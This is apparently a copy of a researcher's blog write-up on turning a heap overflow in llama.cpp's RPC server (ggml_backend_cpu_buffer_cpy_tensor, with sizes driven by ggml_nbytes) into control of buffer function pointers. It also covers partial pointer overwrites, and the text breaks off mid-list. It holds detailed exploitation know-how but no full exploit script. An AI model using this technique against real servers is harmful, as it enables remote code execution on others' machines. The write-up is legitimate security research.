<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://retr0.blog/blog/llama-rpc-rce">Original</a>
    <h1>Heap-overflowing Llama.cpp to RCE</h1>
    
    <div id="readability-page-1" class="page"><div><div><p><iframe src="https://www.youtube.com/embed/aiX32KVTX00?feature=player_embedded" allowfullscreen="" frameborder="0" data-thumbnail-src="https://i.ytimg.com/vi/aiX32KVTX00/0.jpg"></iframe></p></div>

<blockquote>
<p>If you are an exploitation enthusiast, this write-up will be a perfect source of entertainment. I spent ~<code>30h</code> on exploiting the heap-overflow to remote-code execution. At the same time, I had already spent around <code>2 weeks</code> prior researching/understanding <code>Llama.cpp</code> source regarding its very own RPC &amp; Memory implementations. Since <code>Llama.cpp</code> has such a special heap-management system, special features of this system will <strong>fail</strong> the classic <code>ptmalloc</code> exploitations that we are familiar with. Thus, even though this is a heap-overflow, the exploitation won&#39;t be the classic <code>ptmalloc</code> heap-exploitations, rather interesting vectors exploiting <code>Llama.cpp</code>&#39;s implementations logic. Enjoy reading:)</p>
</blockquote>
<p><code>Llama.cpp</code> is always something I would love to work on, a sort of <em>&#39;ultimate&#39;</em> goal for my <code>AI/ML</code> research; not only that but finding a stack/heap-overflow RCE in this sophisticated and well-developed ML Project always sounds so cool. <em>(Besides, I am so hungry for a binary-exp in</em> <code>AI</code> Projects to prove my binary-exploitation things are not &#39;outdated&#39;, but that&#39;s another thing ) Thus, I decided to research on <code>Llama.cpp</code>&#39;s <code>RPC</code> components, when I saw these security adversaries posted on its GitHub <em>&#39;Security&#39;</em> tab - <em>I was like:</em> Wow, these are just simple <em>write-what-where</em>s and <em>read-what-where</em>s; this must be a <em>&#39;money&#39;</em> project to work on with a little bit of efforts required.</p>
<p>Then <code>Llama.cpp</code> proved me very wrong. I found nothing in the first <strong>two weeks</strong>, as they implemented tons of security checks on <code>RPC</code> <code>Tensor</code> deserializations, fully allocated memory <code>&#39;buffer&#39;</code> tracing, and implementations of the <code>RPC</code> endpoints. These <em>write-what-where</em>s were patched strictly so that when you try to exploit again, you might trigger two assert errors on the way, integer overflow was checked everywhere, you can&#39;t mess with the pointers anymore in anyways. It is very secure and not exploitable - devastating it&#39;s, I do gain a better understanding of the implementation itself and <code>cpp</code> <em>(I never systematically learn</em> <code>cpp</code>) - <code>Llama.cpp</code> have its very own memory-management system, memory security patches and mitigations, you will see what I am talking about in most parts of this write-up, we will be dealing with different paradox, mitigation, entirely new methodology and exploitation vectors that I never though up before this such unique exploitation. Finally, everything is just chained together, and you will see what a unique exploitation script and process is, as well as the satisfaction of bypassing everything and not giving up on the process.</p>
<p>For this 10k-word write-up, I spent around a month finishing up the main parts, and refining/editing it took an extra while. Writing this is indeed a painful process. I spent the entire day on the weekend and 4-5 hours during the rest of the week working on it for around two weeks. But on the other hand, it is a joyful process of exploring memory things step-by-step. Who doesn&#39;t like it? Enjoy reading!</p>

<p>The story begins at <code>Llama.cpp</code>&#39;s <code>RPC</code> functions, for the past few months, <code>Llama.cpp</code>&#39;s <code>RPC</code> Server had been a focus of exploitation. <code>rpc-server</code> in <code>llama.cpp</code> enables the execution of the <code>GGML</code> backend on a remote host, allowing for distributed large language model (LLM) inference. By offloading computations to one or more <code>rpc-server</code> instances, users can leverage the processing power of multiple machines or specialized hardware, such as GPUs, to enhance performance.</p>
<p>At the very beginning of the development stage of the <code>RPC</code> server, low-level memory security vulnerabilities were reported (<a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj"><code>GHSA-wcr5-566p-9cwj</code></a>, <a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9"><code>GHSA-5vm9-p64x-gqw9j</code></a>, <a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-mqp6-7pv6-fqjf"><code>GHSA-mqp6-7pv6-fqj</code></a>), mostly exploited on <code>Llama.cpp</code>&#39;s <code>tensor</code> memory-related operations. These early-stage vulnerabilities are straightforward exploits that depend less on GGML&#39;s RPC memory management logic and more on input considerations. However, we should understand a bit about its memory management process;</p>
<p><code>Llama.cpp</code> implements its own mechanism for memory management, based on glibc basic malloc and the classic ptmalloc management methods; meanwhile, added features to the manage-process to optimize <code>Tensor</code> related processing operations.</p>
<p>To begin with, all memory-related operations require a <code>RPC</code> allocated memory via the <code>alloc_buffer</code> command. The <code>RPC</code> endpoint for it requires only a parameter of size. However, this is a bit more complex than simply returning the malloc-ed pointer address. Instead, the address of a <code>buffer</code> structure, allocated additionally, with the actual <code>malloc</code>-ed region wrapped as <code>buffer-&gt;data</code> with be returned; At the meantime, <code>Llama.cpp</code>&#39;s <code>RPC</code> parse request in the format of <code>Tensor</code>, not only as a form of payload for these</p>
<h3 id="heading-prerequisites-tensor-buffer-structure">Prerequisites: <code>Tensor</code>, <code>buffer</code> structure</h3>
<pre><code>    
    <span><span>struct</span> <span>ggml_backend_buffer</span> {</span>
        <span><span>struct</span> <span>ggml_backend_buffer_i</span>  <span>iface</span>;</span>
        <span>ggml_backend_buffer_type_t</span>    buft;
        <span>void</span> * context;
        <span>size_t</span> size;
        <span>enum</span> ggml_backend_buffer_usage usage;
    };
</code></pre>
<p>The <code>buffer</code> structure consists of the <code>buffer</code> methods/pointers structure <code>ggml_backend_buffer_i iface</code>, backend management thread <code>ggml_backend_buffer_type_t buft;</code> the actual address of allocated memory <code>context</code>, the <code>size_t size;</code> of the allocated memory, lastly the <code>ggml_backend_buffer_usage usage</code>; The interesting part here is the <code>iface</code> structure, a part that we will embrace a lot, and take a much deeper analysis during the exploitation steps.</p>
<pre><code>    <span><span>struct</span> <span>ggml_backend_buffer_i</span> {</span>
        <span>void</span>         (*free_buffer)  (<span>ggml_backend_buffer_t</span> buffer);
        <span>void</span> *       (*get_base)     (<span>ggml_backend_buffer_t</span> buffer);
        <span>void</span>         (*init_tensor)  (<span>ggml_backend_buffer_t</span> buffer, struct ggml_tensor * tensor);
        <span>void</span>         (*memset_tensor)(<span>ggml_backend_buffer_t</span> buffer,       struct ggml_tensor * tensor,     <span>uint8_t</span> value, <span>size_t</span> offset, <span>size_t</span> size);
        <span>void</span>         (*set_tensor)   (<span>ggml_backend_buffer_t</span> buffer,       struct ggml_tensor * tensor, <span>const</span> <span>void</span> * data, <span>size_t</span> offset, <span>size_t</span> size);
        <span>void</span>         (*get_tensor)   (<span>ggml_backend_buffer_t</span> buffer, <span>const</span> struct ggml_tensor * tensor,       <span>void</span> * data, <span>size_t</span> offset, <span>size_t</span> size);
        <span>bool</span>         (*cpy_tensor)   (<span>ggml_backend_buffer_t</span> buffer, <span>const</span> struct ggml_tensor * src, struct ggml_tensor * dst);
        <span>void</span>         (*clear)        (<span>ggml_backend_buffer_t</span> buffer, <span>uint8_t</span> value);
        <span>void</span>         (*reset)        (<span>ggml_backend_buffer_t</span> buffer);
    };
</code></pre>
<p><code>Llama.cpp</code>&#39;s multi-architectural made it necessary to assign different methods according to the targeted server architecture; for instance machines with only CPU support&#39;s <code>iface.get_tensor</code> will be set to <code>ggml_backend_cpu_buffer_get_tensor</code>, while CUDA supported server will enable <code>ggml_backend_cuda_buffer_get_tensor</code>. These methods, different in architecture have identical implementation, however, with different compatibility variations (For instance, CUDA machine uses <code>cudaMemcpyAsync</code>, on the other hand CPU versions use the native <code>memcpy</code> from the C-Standard-Library).</p>
<pre><code><span><span>struct</span> <span>ggml_tensor</span> {</span>
        <span>enum</span> ggml_type type;
        GGML_DEPRECATED(<span>enum</span> ggml_backend_type backend, <span>&#34;use the buffer type to find the storage location of the tensor&#34;</span>);
        <span><span>struct</span> <span>ggml_backend_buffer</span> * <span>buffer</span>;</span>
        <span>int64_t</span> ne[GGML_MAX_DIMS]; 
        <span>size_t</span>  nb[GGML_MAX_DIMS]; 
        
        <span>enum</span> ggml_op op;
        
        <span>int32_t</span> op_params[GGML_MAX_OP_PARAMS / <span>sizeof</span>(<span>int32_t</span>)];
        <span>int32_t</span> flags;
        <span><span>struct</span> <span>ggml_tensor</span> * <span>src</span>[<span>GGML_MAX_SRC</span>];</span>
        
        <span><span>struct</span> <span>ggml_tensor</span> * <span>view_src</span>;</span>
        <span>size_t</span>               view_offs;
        <span>void</span> * data;
        <span>char</span> name[GGML_MAX_NAME];
        <span>void</span> * extra; 
        <span>char</span> padding[<span>8</span>];
    };
</code></pre>
<p><code>Tensor</code> is used everywhere in <code>llama.cpp</code>. Here yet we won&#39;t delve in to the technical details of <code>int64_t ne[GGML_MAX_DIMS];</code> / <code>size_t nb[GGML_MAX_DIMS];</code> and how it stores tensors&#39;s shapes and strides. Additionally to tensor data transportations, the <code>Tensor</code> structure in <code>llama.cpp</code> provides a serialization standard for the <code>RPC</code> communications, combined with previous introductions to the <code>buffer</code> structure, lets take a looking in an instance how the memory-allocation-endpoints communicates, using <code>buffer</code> and <code>Tensor</code>.</p>
<h2 id="heading-past-patches-mitigation">Past Patches, Mitigation</h2>
<p>The three reported adversaries we mentioned previously <em>(</em><a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj"><code>GHSA-wcr5-566p-9cwj</code></a>, <a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9"><code>GHSA-5vm9-p64x-gqw9j</code></a>, <a target="_blank" href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-mqp6-7pv6-fqjf"><code>GHSA-mqp6-7pv6-fqj</code></a>) are actually exploitations that are exploiting a fundamental, essence of flaw of design - <strong>the lack of boundary checks on the</strong> <code>buffer</code> / <code>buffer-&gt;data</code> pointer. The existence of this flaw in applied different features of <code>RPC</code> server - whether the <code>get_tensor</code>or the <code>set_tensor</code> allowed attackers to achieve read-what-wheres or write-what-where.</p>
<pre><code><span><span>static</span> <span>void</span> <span>ggml_backend_cpu_buffer_set_tensor</span><span>(<span>ggml_backend_buffer_t</span> buffer, struct ggml_tensor * tensor, <span>const</span> <span>void</span> * data, <span>size_t</span> offset, <span>size_t</span> size)</span> </span>{
    <span>memcpy</span>((<span>char</span> *)tensor-&gt;data + offset, data, size);
    
    GGML_UNUSED(buffer);
}
</code></pre>
<p>However, these memory problems were solved by implementing tons of <code>glibc</code> level memory-checks of the <code>buffer</code> structure - there&#39;s time that a pointer or <code>Tensor</code> size will be check twice, or even more; These mitigations are implemented before deserialization of a tensor <em>(</em><code>deserialize_tensor()</code>), <code>RPC</code> method call-wrappers (e.g <code>rpc_server::set_tensor</code>), call-wrappers&#39;s internal implementations (e.g. <code>ggml_backend_tensor_set</code>), and even in the <code>buffer-&gt;iface</code> implementations (e.g <code>ggml_backend_cpu_buffer_cpy_tensor</code>), these four stage of checks made you aware of the pointer validation according to every-steps of the <code>RPC</code> processing <em>(Fun fact, at the very beginning of the research I spent around 3-5 hours just to figurer out how the tensor checks works so I can try the past exploitation, to see if they fixed it properly, and they did).</em></p>
<p>Looking into these mitigation, going to step-by-step, the first check a remote <code>Tensor</code> will face is the check at <code>deserialize_tensor()</code>, where the <code>tensor-&gt;data</code> pointer, used mainly in <code>get_tensor</code> and <code>set_tensor</code> is checked whether inside of the <code>ggml_backend_buffer_get_base</code> to <code>ggml_backend_buffer_get_size</code> range or not, while it also consider exploitations where <code>tensor_size</code> is possibly negative, which can results backward writes/reads in <code>set/get_tensor</code> method. At the meantime, <code>ggml_backend_buffer_get_base</code>, <code>ggml_backend_buffer_get_size</code>; wrapper for <code>tensor-&gt;context</code> and <code>tensor-&gt;size</code>, made bypassing the mitigation not-easy or we will need to forge a <code>buffer</code> structure, with valid <code>buffer</code> internal pointers.</p>
<pre><code>    
    <span>if</span> (result-&gt;buffer) {
        
        <span>uint64_t</span> tensor_size = (<span>uint64_t</span>) ggml_nbytes(result);
        <span>uint64_t</span> buffer_start = (<span>uint64_t</span>) ggml_backend_buffer_get_base(result-&gt;buffer);
        <span>uint64_t</span> buffer_size = (<span>uint64_t</span>) ggml_backend_buffer_get_size(result-&gt;buffer);
        GGML_ASSERT(tensor-&gt;data + tensor_size &gt;= tensor-&gt;data); 
        GGML_ASSERT(tensor-&gt;data &gt;= buffer_start &amp;&amp; tensor-&gt;data + tensor_size &lt;= buffer_start + buffer_size);
    }
</code></pre>
<blockquote>
<p>Mentioning here the <code>buffer</code> pointer&#39;s validity were also checked in <code>ggml/src/ggml-rpc/ggml-rpc.cpp:843 (deserialize_tensor())</code> -&gt; <code>result-&gt;buffer &amp;&amp; buffers.find(result-&gt;buffer) == buffers.end()</code>, by examining the global <code>buffer</code> management array <code>buffers</code>, this prevents any pre-forged <code>buffer</code> structure exploitations</p>
</blockquote>
<p><code>request.tensor.data</code> / (<code>buffer-&gt;data</code>) validity, with <code>request.offset</code> / <code>request.size</code> are checked furthermore in the call-wrapper implementations, here the sanitization is similar to the previous ones using <code>ggml_backend_buffer_get_base</code>, <code>ggml_backend_buffer_get_size</code> (we might refer this to <code>p0</code> <code>p1</code> in the future), however, with included the <code>offset</code> / <code>size</code> which is a part of the <code>RPC</code> passed parameter, these can change the range of the final <code>get_tensor</code> / <code>set_tensor</code> thus checked together with the <code>buffer-&gt;data</code>. Interestingly here also checked if <code>request.tensor.data + request.offset</code> is negative to prevent backwards write/read. While prevented out-of-bounds read/write via <code>request.size</code>.</p>
<pre><code>    
    {
        <span>const</span> <span>size_t</span> p0 = (<span>size_t</span>) ggml_backend_buffer_get_base(tensor-&gt;buffer);
        <span>const</span> <span>size_t</span> p1 = p0 + ggml_backend_buffer_get_size(tensor-&gt;buffer);

        <span>if</span> (request.tensor.data + request.offset &lt; p0 ||
            request.tensor.data + request.offset &gt;= p1 ||
            request.size &gt; (p1 - request.tensor.data - request.offset)) {
                GGML_ABORT(<span>&#34;[%s] tensor-&gt;data out of bounds\n&#34;</span>, __func__);
        }
    }
</code></pre>
<p>Lastly, some <code>buffer-&gt;iface</code> implementation also implemented checks. For instance, <code>ggml_backend_cpu_buffer_cpy_tensor</code> checked <code>(ggml_backend_buffer_is_host(src-&gt;buffer)) {</code> to make sure that the validity of <code>src-&gt;buffer</code>. This is a fully considered sanitization since one possible exploitation I considered <strong>is manually leaving</strong> <code>src-&gt;buffer</code> to <code>NULL</code>, which will fail the <code>p0/p1</code> checks on the <code>src-&gt;data</code> checks <em>(since</em> <code>buffer</code> is a <code>NULL</code> pointer, internal processing of <code>ggml_backend_buffer_get_base</code> will skip tests and return <code>0</code>), potentially allowing us to leak arbitrary address. It is very exploitable, and this is a part of their considerations.</p>

<p>Despite the <code>buffer-&gt;data</code> pointer being sanitized in every possible way, the <code>get_base()</code> (<code>buffer-&gt;context</code>) and <code>buffer-&gt;size</code> are being examined in such scary ways. However, we still found an interesting heap-overflow vector hidden in the jungle of <code>ggml_backend_cpu</code> method during the research process.</p>
<p>The exploitation starts with an interesting method: <code>ggml_nbytes</code>, a technique for calculating the dimension size of Tensor objects.</p>
<pre><code><span><span>size_t</span> <span>ggml_nbytes</span><span>(<span>const</span> struct ggml_tensor * tensor)</span> </span>{
    <span>size_t</span> nbytes;
    <span>const</span> <span>size_t</span> blck_size = ggml_blck_size(tensor-&gt;type);
    <span>if</span> (blck_size == <span>1</span>) {
        nbytes = ggml_type_size(tensor-&gt;type);
        <span>for</span> (<span>int</span> i = <span>0</span>; i &lt; GGML_MAX_DIMS; ++i) {
            nbytes += (tensor-&gt;ne[i] - <span>1</span>)*tensor-&gt;nb[i];
        }
    }
    <span>else</span> {
        nbytes = tensor-&gt;ne[<span>0</span>]*tensor-&gt;nb[<span>0</span>]/blck_size;
        <span>for</span> (<span>int</span> i = <span>1</span>; i &lt; GGML_MAX_DIMS; ++i) {
            nbytes += (tensor-&gt;ne[i] - <span>1</span>)*tensor-&gt;nb[i];
        }
    }
    <span>return</span> nbytes;
}

<span><span>int64_t</span> <span>ggml_blck_size</span><span>(<span>enum</span> ggml_type type)</span> </span>{
    <span>return</span> type_traits[type].blck_size;
}

<span>static</span> <span>const</span> <span><span>struct</span> <span>ggml_type_traits</span> <span>type_traits</span>[<span>GGML_TYPE_COUNT</span>] = {</span>
    [GGML_TYPE_I8] = {
        .type_name                = <span>&#34;i8&#34;</span>,
        .blck_size                = <span>1</span>,
        .type_size                = <span>sizeof</span>(<span>int8_t</span>),
        .is_quantized             = <span>false</span>,
    },
    
</code></pre>
<p><code>ggml_nbytes()</code> is a method that is often loaded by <code>llama.cpp</code> as in the <code>libggml-base.so</code> (<code>ggml.c</code>) to calculate the data size of a <code>Tensor</code> <em>(A tensor is a multi-dimensional data structure commonly used in machine learning and numerical computing)</em> based on a <code>Tensor</code>&#39;s shape <code>tensor-&gt;ne[]</code> and stride <code>tensor-&gt;nb[]</code>.</p>
<p>The <code>ggml_blck_size</code> gets its corresponded <code>blck_size</code> via method <code>ggml_blck_size</code>, a wrapper for the global variable <code>type_traits</code> <em>(Interestingly, past vulnerabilities were identified in</em> <code>ggml_blck_size</code> when <code>type</code> of the <code>ggml_tensor</code> wasn&#39;t limited/sanitized, this allowed out-of-bounds reads based on the <code>type_traits</code> global variable, until they introduced size limitation on <code>Tensor-&gt;type</code>); These <code>.blck_size</code> does not increase linearly, instead, dependent on the properties of <code>GGML_TYPE_X</code> itself.</p>
<p>The interesting part here is the <code>nbytes</code>, size of the <code>Tensor</code> is calculated and determined by the <code>tensor-&gt;ne[i]</code> array, <code>tensor-&gt;nb[0]</code>, and the <code>tensor-&gt;type</code> <em>(being converted into</em> <code>blck_size</code> using <code>ggml_blck_size</code>), meaning that, <strong>if the</strong> <code>Tensor</code>&#39;s <code>(ne[] || nb[])</code> is controlled, the returned <code>nbytes</code> will be controlled <em>(to delve deeper in the exploitation part regarding the calculation of</em> <code>ggml_nbytes</code>, we will not explain how the size is calculated right now). This won&#39;t really be a problem at in <code>llama.cpp</code>&#39;s general usage of <code>ggml_nbytes</code>, since GGML <code>Tensors</code> typically have practical limits on their dimensions due to memory constraints. <strong>However</strong>, this does become a start of the storm at one of <code>GGML</code>&#39;s backend dynamic <code>iface</code> binding method, <code>ggml_backend_cpu_buffer_cpy_tensor</code>.</p>
<pre><code><span><span>static</span> <span>bool</span> <span>ggml_backend_cpu_buffer_cpy_tensor</span><span>(<span>ggml_backend_buffer_t</span> buffer, <span>const</span> struct ggml_tensor * src, struct ggml_tensor * dst)</span> </span>{
    <span>if</span> (ggml_backend_buffer_is_host(src-&gt;buffer)) {
        <span>memcpy</span>(dst-&gt;data, src-&gt;data, ggml_nbytes(src));
        <span>return</span> <span>true</span>;
    }
    <span>return</span> <span>false</span>;

    GGML_UNUSED(buffer);
}
</code></pre>
<p>This seems like a proper functioning and secure <code>buffer-&gt;iface</code> implementation <em>(might seemed more innocent if I don&#39;t put it in context of a exploitation blog and just introduced</em> <code>ggml_nbytes</code> in a exploitation blog), regarding all the 3-level checks <code>llama.cpp</code> implemented, these checks stop us from any sort of way to mess with the <code>buffer-&gt;data</code> pointer or the passed <code>offset</code> / <code>size</code>. Mentioning that the small check on <code>ggml_backend_buffer_is_host</code>, nothing really to exploit on the <code>cpy</code> functionality of it.</p>
<p>However, notice we that the size of <code>memcpy</code> is calculated by the <code>Tensor</code> dimensional size of <code>src</code>, using the <code>ggml_nbytes</code>, and you will starting to see the problem. You see, despite <code>ggml-rpc.cpp:854</code>&#39;s <code>ggml_nbytes</code> checks regarding the <code>uint64_t tensor_size = (uint64_t) ggml_nbytes(result)</code> with <code>tensor-&gt;data</code> and <code>buffer_start</code>. <strong>However, these only check whether the out-of-bounds happen within the buffer-&gt;context</strong>.</p>
<p>In case of copying one <code>src-&gt;data</code> to another <code>context</code>, <code>dst-&gt;data</code>, <code>ggml_nbytes</code> calculations are manipulated by input-controllable <code>Tensor</code> member <code>ne[]</code>/ <code>nb[]</code>, which will be copied precisely during <code>deserialize_tensor()</code>, and this <code>iface</code> implementation did not compare for the <code>ggml_nbytes</code> size between the <code>src</code> and <code>dst</code> <code>Tensor</code>, this allowed us to construct a <em>&#39;larger&#39;</em> <code>Tensor</code> as <code>dst</code>, specified a large dimension size for the <em>&#39;smaller&#39;</em> <code>src</code> <em>(For large and small we regard the actual applied size)</em>, this will result overlapping of <code>src</code>&#39;s data to the <code>dst</code>, <strong>leading to heap overflow.</strong></p>
<p>In the meantime, the controllable of src-&gt;context also guaranteed the exploitability of this vulnerability; we can previously set src-&gt;context using set_tensor to fill src-&gt;context with payload and overflow based on <code>dst-&gt;context</code>.</p>

<p>Finding the heap-overflow is a great thing, but getting to exploit a heap-overflow is even better, usually the crash files from a <code>heap-overflow</code> / <code>asan</code> is sufficient enough to submit as a <code>heap-overflow</code>, but what&#39;s the fun of that. But on the other hand, exploiting this heap-overflow in a unique and sophisticated memory-management system does drag us into this storm, and the World of Paradox.</p>
<blockquote>
<p>The whole exploitation part was written with the process of the research, meaning that part of it was written before the vulnerability was proved exploitable (which also made it very enjoyable to read). I recommends reading till the end, things and things get more interesting</p>
</blockquote>
<p>Setting a breakpoint at the room where it happened, here&#39;s what my first thought goes, taking a look into <code>dst-&gt;data</code>, we will find that this structure is highly close to the <code>buffer</code> structure:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726511941/09b79026-cf40-4266-9ed9-649f3a56ee49.png" alt=""/></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726520302/c8b81b1d-9996-48da-944d-06b5da0ffeac.png" alt=""/></p>
<p>In this case, the closest <code>buffer</code> structure is at <code>0x55555557dd10-0x55555557dc00</code>, only <code>0x110</code> to the overflown <code>dst-&gt;data</code>. Such a &#34;coincidence&#34; in the arrangement of chunks made us very happy! Why? You might have asked, this will need us to take a look back at <code>ggml/src/ggml-rpc/ggml-rpc.cpp</code>; this is what happens when a request is parsed into the RPC Server, using <code>get_tensor</code> operation as an example:</p>
<ol>
<li><p>Enters <code>static void rpc_serve_client(ggml_backend_t backend, sockfd_t sockfd, size_t free_mem, size_t total_mem) {</code>, where the RPC Server listen for socket connections</p>
</li>
<li><p>Enter specific case switch as what the <code>p8()</code> command indicates; in this case, it will enter <code>case RPC_CMD_GET_TENSOR:</code></p>
</li>
<li><p>Then into <code>server.set_tensor(input)</code>, the <code>rpc_server</code> type method for handling requests, where here the server deserialize tensors, check for boundaries and sanitation...</p>
</li>
<li><p>Eventually, enters a method of <code>ggml_backend_*</code> (in this case <code>ggml_backend_tensor_set</code>), this method is located in the <code>ggml-backend.cpp</code> file, where the actual operations regarding tensors happen.</p>
</li>
<li><p>Inside of the <code>ggml_backend_*</code> file, because different type/architecture of RPC servers, Llama.cpp does not use single-static methods to operate for these tensors; instead, these operation &#34;threads&#34; are assigned on runtime and stored on the <code>buffer</code> thread (as <code>buf-&gt;iface</code> ), e.g. <code>tensor_set</code> operation calls <code>buf-&gt;iface.set_tensor(buf, tensor, data, offset, size);</code> eventually.</p>
</li>
</ol>
<p>What this means is that if we can control the buffer address (not the context address) via overflowing since they are in such adjacent address, we can control the members of the <code>buffer</code> structure; for example, by manipulating <code>buffer-&gt;iface</code>, the back-end operation methods. We can redirect the execution flow to an arbitrary address; by manipulating the <code>context</code> variables, we can bypass existing range checks to re-establish/bypass the mitigation on write-what-where / read-what-where!</p>
<p>For now, our job will be manipulating the heap calculating heap offset between chunks and structure members using <code>cyclic</code> and <code>flat()</code>; this is a long process since usually other heap components will be affected during the overflow. The size of overflown need to be calculate carefully or you will overwrite unintentionally, this required you to play with the <code>dimension-size</code> in both <code>written-tensor</code> / <code>overflown-tensor</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726540144/c95c19d4-7bde-4c95-be7e-5c5af4d6adf6.png" alt=""/></p>
<p>After spending a morning working on the side-effect of the overflow,<strong>we can call arbitrary address now!</strong> (For some reason, we will corrupt other chunk&#39;s header during overflow, causing errors in <code>free()</code> / <code>munmap_chunk(): invalid pointer</code>, fixed by observing the heap structure before/after overflow, you will need to set a chunk&#39;s header manually), since we can arrange allocated chunk freely, we can <em>predict</em> the size header of the next chunk if we use the same allocating approach at the same time (while considering the <code>prev_in_use</code> flag, in this case we write <code>sizeof(buffer)+0x8</code> to <code>0x110</code>)</p>
<h2 id="heading-paradox-of-overflow">Paradox-of-Overflow</h2>
<p>As I should mentioned before, both <code>deserialize_tensor</code> or the implementation of the backend method presents strict boundary checks regarding the <code>context</code> size and <code>tensor-&gt;data</code> ranging after the previous patch. Specifically, the mitigation in <code>deserialize_tensor</code> checks if the <code>tensor-&gt;data</code> is in range via <code>ggml_backend_buffer_get_base</code> and <code>ggml_backend_buffer_get_size</code> ( both method depends on the <code>buffer</code> members <code>buffer-&gt;context</code> and <code>buffer-&gt;size</code>), while implementation checks if the boundary can be corrupted under the influence of request parameters. `` The problem arises here: Exploiting this overflow to a new, hellish level. Even though we can control the execution flow of the RPC server to an arbitrary address, we have zero addresses that we can exploit by manipulating the execution flow. Usually, this will be a easy-to-solve problem, since we already have control over the <code>buffer</code> structure, we can manipulate <code>buffer</code> members used in the sanitation process of <code>tensor-&gt;data</code> / <code>buffer</code> base, to bypass the previous patches on previous vulnerabilities. However, here the Paradox-of-Overflow came in place:</p>
<ol>
<li><p>To bypass <code>tensor-&gt;data</code> / <code>buffer_base</code> boundary mitigation, we will have to modify the <code>buffer</code> &#39;s <code>context</code> / <code>get_base</code> members</p>
</li>
<li><p>Modifying <code>buffer</code> will corrupt other <code>buffer</code> member and pointers when we haven&#39;t obtained / leaked the <code>ggmlbase</code> base address to calculate the actual address of these <code>buffer-&gt;iface</code> ptrs.</p>
</li>
<li><p>To leak <code>ggmlbase</code> pointers, or the <code>ggmlbase</code> base address, we must external of the legal <code>tensor-&gt;data</code> range, meaning that we must bypass the boundary mitigation, which bought us back to the first step.</p>
</li>
</ol>
<p>Re-mentioning the fact that we hold zero-pointers at the point of the first overflow, the <em>paradox-of-overflow</em> made it impossible to exploit solely depending on <code>buffer</code> - This= can be a <em>really, really</em> useful vector when we can edit <code>buffer</code> members such as <code>context</code>, <code>get_base</code> with out risking corrupting the entire <code>buffer</code> (In this, we can bypass anything to leak <code>libc</code> etc furthermore). But for now, it&#39;s best that we leave this vector here and use it when we need it!</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726555870/9bafce47-3b38-4577-9364-a58bdca935ab.png" alt=""/></p>
<h2 id="heading-partial-write-partial-write-in-real-life">Partial-write: partial-write in real life?</h2>
<p>In classic <code>glibc</code> CTF exploitation, there&#39;s a technique or a little trick that people know about but are getting less practical nowadays called partial writing. By &#34;partial writing,&#34; it means that we are writing parts (sounds like a cliche but needed to reinforce) of the pointers.</p>
<p>For readers who are not familiar with partial-writing, in most systems, pointers are stored as multi-byte values (e.g., 8 bytes on a 64-bit system). These bytes can be broken down into smaller sections, such as the lower 2 bytes (<code>LSB</code>), the middle bytes, or the higher-order bytes (<code>MSB</code>), and how they are stored is often counter-intuitive in little-endian architecture, where the <code>MSB</code> is stored at the larger memory address, while the <code>LSB</code> is at the lower ones, what this means is that a pointer of <code>0xdeadbeef</code>, for example, looks like <code>ef be ad de</code> in memory.</p>
<p>Binary often requires libraries to run, for the example, the standard-c-library <code>libc</code> or other self-compiled library, although <em>you can statically compile a binary (embedding the external method / types inside of the binary),</em> but this will result a considerably large ELF. Instead, during runtime, the elf will <em>statically link</em> the library to the elf, and the library will map be mapped into memory segmentation of the program (you can check for the memory mapping using <code>vmmap</code> in <code>gdb</code>), and be referenced using ( <code>offset</code> / <em>&#39;real-address&#39; in library</em> + <code>mapping_base</code> ). However, thanks to <code>ASLR</code>, these base addresses are loaded/mapped randomly, in case the elf did not encapsulate a method for, e.g, executing command and we are seeking RCEs, the only way for us to call for <code>system</code> is to first, leaked the dynamic-linked library&#39;s (<em>usually the</em> <code>libc.so.6</code>) mapped base-address in the elf, then using the fixed offset in the library to calculate the actual address of the method.</p>
<p>Now, here&#39;s where partial-writing becomes particularly interesting. Thanks to the combination of the memory-aligning mechanism in address mapping of dynamic-linked libraries, and little-endian architecture, it enabled an interest vector that allows us to access <em>certain</em> methods in the dynamic-linked library without knowing any mapped base address: <strong>partial overflowing the pointer</strong> - without corrupting the mapped base, since all base address aligns at <code>0x1000</code>, the last-two byte of a dynamic-linked pointer will not be reflected by the loaded aslr-ed base, but straightforwardly represented by the dynamic-linked offset, thus with the power that little-endian gave us, which we are able to modify a pointer at the <code>LSB</code> part, allowed us to <strong>manipulate the pointer to arbitrary-offset of the same base!</strong> Even though that we cannot write one-and-half bytes to a pointer, however, it takes maximum value of <code>0xf = 16</code> guesses to guarantee validate nibble of the mapped base.</p>
<h3 id="heading-paradox-of-partial-write-again">Paradox of Partial-write? Again?</h3>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726584306/b30834dd-359c-497f-ae85-be3f20b390af.png" alt=""/></p>
<p>In the case of our exploitation, all <code>buffer-&gt;iface</code> pointers belongs to the <code>libggml-base</code> dynamic-linked library, sharing the same base (you can observe that all pointers start with <code>0x7ffff7e7....</code>) theoretically, we can manipulate them into arbitrary method in compiled in <code>libggml-base.so</code>. However, taking another closer look, you will find that <strong>this is actually a extremely difficult exploitation path</strong> since:</p>
<ol>
<li><p>Controlling the <code>ggml_nbytes</code> is extremely-hard / and time-consuming, because that you can&#39;t &#34;calculate&#34; the size. Instead, you will need to change the dimension specification of the tensor, leaving around 40 different combinations.</p>
</li>
